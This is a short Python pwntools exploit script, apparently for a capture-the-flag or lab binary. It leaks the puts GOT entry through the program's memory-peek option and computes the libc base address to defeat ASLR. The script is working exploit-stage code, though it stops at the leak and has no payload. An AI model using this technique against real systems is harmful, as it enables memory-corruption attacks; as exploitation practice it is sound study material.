#!/usr/bin/python 

from pwn import *

time = 0.2

# Executes the program
p = process("./2_event1")

def main():
	setuid_arg = 0;

	skip_option() # Skips name
	send_name(str(setuid_arg)) # Stores setuid_arg in the stack

	skip_option() # Skips option
	select_peek_memory_addr()		

	'''
	readelf -r ./2_event1| grep puts
	0804a020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
	'''
	puts_GOT = 0x0804a020
	send_hex_address(puts_GOT)

	data = ""
	data = skip_option_and_return_data(data)
	
	libc_base_addr = 0x0 
	libc_base_addr = get_libc_base_addr(data, libc_base_addr)

	# Pass interaction back to user
	p.interactive()

def skip_option():
	p.recvrepeat(time)

def skip_option_and_return_data(data):
	data = p.recvrepeat(time)
	return data

def send_name(name):
	p.sendline(name)

def select_peek_memory_addr():
	p.sendline("1")

def send_hex_address(addr):
	p.sendline(hex(addr))

def get_libc_base_addr(data, libc_base_addr):
	puts_addr = ""

	for i in data.split("\n"):
		if "Contents:" in i:
			# Finds only hex address
			puts_addr = i[ i.find("0x") : len(i) ] 	

			# Converts type from string to hex
			puts_addr = int(puts_addr, 16)

	# Informs user on puts address	
	log.info("puts address -> 0x%x " %puts_addr)	

	'''
	Offset puts:

        objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<_IO_puts@@GLIBC_2.0>"
        --> 0005fca0 <_IO_puts@@GLIBC_2.0>:
	'''
	puts_offset = 0x0005fca0
	libc_base_addr = puts_addr - puts_offset 

	# Informs user on libc base address
	log.info("libc base address -> 0x%x" %libc_base_addr)
	
	return libc_base_addr

if __name__ == "__main__": 
	main()
